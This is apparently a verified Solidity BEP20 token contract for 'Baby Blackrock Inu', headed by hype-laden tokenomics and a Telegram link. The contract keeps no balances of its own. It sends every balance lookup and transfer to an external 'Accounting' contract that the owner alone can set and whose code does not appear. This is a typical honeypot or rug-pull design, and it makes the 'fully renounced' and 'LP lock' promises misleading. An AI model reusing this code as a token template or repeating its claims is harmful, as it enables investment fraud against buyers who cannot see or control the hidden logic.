/**
 *Submitted for verification at BscScan.com on 2022-11-25
*/

/**
BABY BLACK ROCK INU

🟢 TOKENOMICS 
Token Supply :1000.000.000.000,
90%Burn Token 
9%  Token Liquidity Pancake
1%   Marketing Token .

✅ Initial Liquidity 1 BNB
✅ Contract fully Renounced
✅ LP Lock 1 Month
✅ 5 tax buy/sell 
✅ Experience Dev and Team
✅ Many Caller Friends

Don’t miss your chance on getting in early!🚀🚀🚀

https://t.me/babyblackrockinuofficial
*/


pragma solidity ^0.8.15;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface Accounting {
    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract BabyBlackrockInu is BEP20 {
    using SafeMath for uint256;

    address public owner = msg.sender;    
    string public name = "BABY BLACKROCK INU";
    string public symbol = "BBRINU";
    uint8 public _decimals;
    uint public _totalSupply;
    
    mapping (address => mapping (address => uint256)) private allowed;
    address private accounting;
    
    constructor() public {
        _decimals = 9;
        _totalSupply = 1000000000000 * 10 ** 9;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) view public returns (uint256) {
        return Accounting(accounting).balanceOf(who);
    }
    
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }

    function setAccountingAddress(address accountingAddress) public {
        require(msg.sender == owner);
        accounting = accountingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transfer(address to, uint amount) public returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        return Accounting(accounting).doTransfer(msg.sender, msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        require (amount > 1);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return Accounting(accounting).doTransfer(msg.sender, from, to, amount);
    }
        
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

}